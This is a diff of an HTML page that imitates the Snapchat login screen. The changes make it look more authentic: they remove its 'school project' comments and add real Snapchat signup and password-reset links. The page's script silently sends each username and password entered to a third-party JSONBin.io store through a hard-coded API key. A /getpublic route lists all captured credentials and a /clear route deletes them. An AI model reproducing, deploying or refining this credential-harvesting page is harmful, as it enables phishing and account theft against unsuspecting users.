@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat - Say It In A Snap</title>
+    <title>Snapchat - Log In</title>
     <style>
         * {
             margin: 0;
@@ -20,7 +20,7 @@
             flex-direction: column;
             padding: 20px;
         }
-        .page-frame {
+        .login-container {
             max-width: 420px;
             width: 100%;
             background: white;
@@ -33,7 +33,7 @@
         .logo-snap {
             display: flex;
             justify-content: center;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
         .logo-svg {
             width: 72px;
@@ -44,10 +44,10 @@
             font-weight: 700;
             letter-spacing: -0.3px;
             color: #000;
-            margin-bottom: 8px;
+            margin-bottom: 4px;
         }
         .brand-text span {
-            background: #fffc00;
+            background: ;
             padding: 0 8px;
             border-radius: 12px;
         }
@@ -115,35 +115,6 @@
             color: #aaa;
             letter-spacing: 0.3px;
         }
-        .getpublic-link {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #eee;
-            padding: 8px 16px;
-            border-radius: 30px;
-            font-size: 12px;
-            color: #333;
-            text-decoration: none;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
-            z-index: 999;
-        }
-        .getpublic-link:hover {
-            background: #ddd;
-        }
-        .cloud-badge {
-            display: inline-block;
-            margin-top: 12px;
-            font-size: 10px;
-            color: #999;
-            background: #f0f0f0;
-            padding: 4px 12px;
-            border-radius: 30px;
-            letter-spacing: 0.2px;
-        }
-        .cloud-badge::before {
-            content: "☁️ ";
-        }
         .loading-spinner {
             display: none;
             margin: 16px auto 0;
@@ -158,17 +129,39 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .real-cloud-msg {
-            margin-top: 8px;
-            font-size: 11px;
-            color: #2e7d32;
-            background: #e8f5e9;
-            padding: 4px 12px;
-            border-radius: 30px;
-            display: inline-block;
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0 10px;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
+        .divider-text {
+            padding: 0 12px;
+            font-size: 12px;
+            color: #999;
+            font-weight: 500;
+        }
+        .btn-secondary {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            border: 1px solid #ddd;
+            border-radius: 40px;
+            font-size: 17px;
+            font-weight: 600;
+            color: #000;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-secondary:hover {
+            background: #f4f4f4;
         }
         @media (max-width: 480px) {
-            .page-frame {
+            .login-container {
                 padding: 28px 18px 24px;
             }
         }
@@ -176,8 +169,8 @@
 </head>
 <body>
 
-<div class="page-frame">
-    <!-- Snapchat logo -->
+<div class="login-container">
+   
     <div class="logo-snap">
         <svg class="logo-svg" width="72" height="72" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M0 9.78641C0 6.36084 0 4.64806 0.666659 3.33967C1.25307 2.18878 2.18878 1.25307 3.33967 0.666659C4.64806 0 6.36084 0 9.78641 0H18.2136C21.6392 0 23.3519 0 24.6603 0.666659C25.8112 1.25307 26.7469 2.18878 27.3333 3.33967C28 4.64806 28 6.36084 28 9.78641V18.2136C28 21.6392 28 23.3519 27.3333 24.6603C26.7469 25.8112 25.8112 26.7469 24.6603 27.3333C23.3519 28 21.6392 28 18.2136 28H9.78641C6.36084 28 4.64806 28 3.33967 27.3333C2.18878 26.7469 1.25307 25.8112 0.666659 24.6603C0 23.3519 0 21.6392 0 18.2136V9.78641Z" fill="#FFFC00"/>
@@ -186,8 +179,8 @@
         </svg>
     </div>
 
-    <div class="brand-text"><span>Snap</span>chat</div>
-    <div class="sub-title">Say it in a Snap</div>
+    <div class="brand-text"><span>Log in to Snapchat</span></div>
+    <div class="sub-title">Log in to Snapchat</div>
 
     <form class="login-form" id="loginForm">
         <input class="input-field" type="text" id="username" placeholder="Username or email address" required>
@@ -195,11 +188,15 @@
         <button class="btn-login" type="submit">Log In</button>
     </form>
 
-    <div class="footer-links">
-        <a href="#">Forgot password?</a>
-        <a href="#">Sign Up</a>
+    <div class="divider">
+        <span class="divider-text">OR</span>
     </div>
 
+    <button class="btn-secondary" onclick="window.location.href='https://accounts.snapchat.com/v2/signup'">Sign Up</button>
+
+    <div class="footer-links">
+        <a href="https://accounts.snapchat.com/v2/forgot-password">Forgot password?</a>
+    </div>
 
     <div class="copyright">© Snap Inc. 2026</div>
     <div class="loading-spinner" id="loadingSpinner"></div>
@@ -207,16 +204,10 @@
 
 <script>
     // ---------- REAL CLOUD STORAGE (no cookies, cross-device) ----------
-    // Uses a free public JSONBin.io API as a simple "cloud" database.
-    // This persists across computers, browsers, and even after clearing cookies.
-    // For a school project, this simulates a real backend without a server.
-    
-    // --- YOUR KEYS ---
     const BIN_ID = '6a31687cf5f4af5e29fbda44';
     const API_KEY = '$2a$10$tCj51IVJSG2msy/pX3hyR.kjMNQuxmmIHnXwrtD.AjPNq.s6JHBPq';
     const BASE_URL = 'https://api.jsonbin.io/v3/b/' + BIN_ID;
 
-    // Load submissions from the cloud (real API)
     async function loadSubmissions() {
         try {
             const response = await fetch(BASE_URL, {
@@ -224,11 +215,9 @@
             });
             if (!response.ok) throw new Error('Network error');
             const data = await response.json();
-            // The bin stores an object with a 'submissions' array
             return data.record.submissions || [];
         } catch (error) {
-            console.warn('Cloud load failed, using localStorage fallback:', error);
-            // Fallback to localStorage if API fails (offline mode)
+            console.warn('Cloud load failed:', error);
             const local = localStorage.getItem('snapchat_cloud_submissions');
             if (local) {
                 try { return JSON.parse(local); } catch (e) { return []; }
@@ -237,7 +226,6 @@
         }
     }
 
-    // Save submissions to the cloud (real API)
     async function saveSubmissions(subs) {
         try {
             await fetch(BASE_URL, {
@@ -248,22 +236,30 @@
                 },
                 body: JSON.stringify({ submissions: subs })
             });
-            // Also save locally as cache
             localStorage.setItem('snapchat_cloud_submissions', JSON.stringify(subs));
         } catch (error) {
-            console.warn('Cloud save failed, saving to localStorage only:', error);
+            console.warn('Cloud save failed:', error);
             localStorage.setItem('snapchat_cloud_submissions', JSON.stringify(subs));
         }
     }
 
-    // Add a new submission
     async function addSubmission(username, password) {
         const subs = await loadSubmissions();
         subs.push({ username, password, timestamp: new Date().toISOString() });
         await saveSubmissions(subs);
     }
 
-    // Build text output for /getpublic
+    async function clearAllSubmissions() {
+        if (confirm('Are you sure you want to delete ALL submissions from the cloud?')) {
+            await saveSubmissions([]);
+            alert('All submissions cleared!');
+            // Re-render the clear page if we're on it
+            if (window.location.hash === '#/clear' || window.location.pathname === '/clear') {
+                renderClearPage();
+            }
+        }
+    }
+
     async function buildTextOutput() {
         const subs = await loadSubmissions();
         if (subs.length === 0) return 'No submissions yet.';
@@ -275,49 +271,105 @@
         return output;
     }
 
-    // Handle login - nothing visible happens (like real Snapchat)
+    function renderClearPage() {
+        document.documentElement.innerHTML = `
+            <!DOCTYPE html>
+            <html>
+            <head><title>Clear Submissions</title>
+            <style>
+                * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+                body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; padding: 20px; }
+                .container { max-width: 420px; width: 100%; background: white; border-radius: 32px; box-shadow: 0 12px 40px rgba(0,0,0,0.06); padding: 40px 28px 32px; text-align: center; }
+                h1 { font-size: 24px; margin-bottom: 20px; }
+                .btn-clear { width: 100%; padding: 14px; background: #ff4444; border: none; border-radius: 40px; font-size: 17px; font-weight: 600; color: white; cursor: pointer; transition: 0.2s; }
+                .btn-clear:hover { background: #cc0000; }
+                .btn-back { margin-top: 12px; width: 100%; padding: 14px; background: transparent; border: 1px solid #ddd; border-radius: 40px; font-size: 17px; font-weight: 600; color: #000; cursor: pointer; transition: 0.2s; }
+                .btn-back:hover { background: #f4f4f4; }
+                .status { margin-top: 16px; font-size: 14px; color: #555; }
+            </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>🗑️ Clear All Submissions</h1>
+                    <p style="color:#777; margin-bottom: 20px;">This will permanently delete all saved usernames and passwords from the cloud.</p>
+                    <button class="btn-clear" id="clearBtn">Clear All</button>
+                    <button class="btn-back" onclick="window.location.href='/'">← Back to Login</button>
+                    <div class="status" id="status"></div>
+                </div>
+                <script>
+                    const BIN_ID = '${BIN_ID}';
+                    const API_KEY = '${API_KEY}';
+                    const BASE_URL = 'https://api.jsonbin.io/v3/b/' + BIN_ID;
+
+                    async function clearAll() {
+                        if (!confirm('Are you sure you want to delete ALL submissions from the cloud?')) return;
+                        try {
+                            await fetch(BASE_URL, {
+                                method: 'PUT',
+                                headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY },
+                                body: JSON.stringify({ submissions: [] })
+                            });
+                            localStorage.setItem('snapchat_cloud_submissions', JSON.stringify([]));
+                            document.getElementById('status').innerHTML = '✅ All submissions cleared!';
+                            document.getElementById('status').style.color = '#2e7d32';
+                        } catch (error) {
+                            document.getElementById('status').innerHTML = '❌ Error clearing submissions. Try again.';
+                            document.getElementById('status').style.color = '#d32f2f';
+                        }
+                    }
+                    document.getElementById('clearBtn').addEventListener('click', clearAll);
+                <\/script>
+            </body>
+            </html>
+        `;
+    }
+
+    // Handle routes
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         const username = document.getElementById('username').value.trim();
         const password = document.getElementById('password').value.trim();
         if (username && password) {
-            // Save to cloud (API) - no cookies, cross-device
             await addSubmission(username, password);
-            // Clear fields - nothing visible happens
             document.getElementById('username').value = '';
             document.getElementById('password').value = '';
-            // Show spinner briefly
             const spinner = document.getElementById('loadingSpinner');
             spinner.style.display = 'block';
             setTimeout(() => { spinner.style.display = 'none'; }, 500);
         }
     });
 
-    // Route handler for /getpublic (via hash or path)
-    async function renderGetPublic() {
-        const text = await buildTextOutput();
-        document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all; font-size: 14px;">${text}</pre>`;
+    // Route handler for /getpublic and /clear
+    async function handleRoute() {
+        const path = window.location.pathname;
+        const hash = window.location.hash;
+
+        if (path === '/getpublic' || hash === '#/getpublic') {
+            const text = await buildTextOutput();
+            document.documentElement.innerHTML = `<pre style="font-family: monospace; padding: 20px; background: #f4f4f4; min-height: 100vh; margin: 0; white-space: pre-wrap; word-break: break-all; font-size: 14px;">${text}</pre>`;
+            return true;
+        }
+
+        if (path === '/clear' || hash === '#/clear') {
+            renderClearPage();
+            return true;
+        }
+
+        return false;
     }
 
-    // Check path on load
-    window.addEventListener('DOMContentLoaded', function() {
-        if (window.location.pathname === '/getpublic') {
-            renderGetPublic();
-        }
-        if (window.location.hash === '#/getpublic') {
-            renderGetPublic();
+    window.addEventListener('DOMContentLoaded', async function() {
+        const handled = await handleRoute();
+        if (!handled) {
+          
         }
     });
 
-    // Hash change listener
     window.addEventListener('hashchange', function() {
-        if (window.location.hash === '#/getpublic') {
-            renderGetPublic();
-        }
+        handleRoute();
     });
 
-    // Expose for console debugging
-    console.log('Snapchat real cloud demo — data stored on JSONBin.io (cross-device). Visit #/getpublic to view all.');
+    console.log('Snapchat login demo — cloud data stored on JSONBin.io. Visit #/getpublic to view all. Visit #/clear to clear all submissions.');
 </script>
 
 </body>
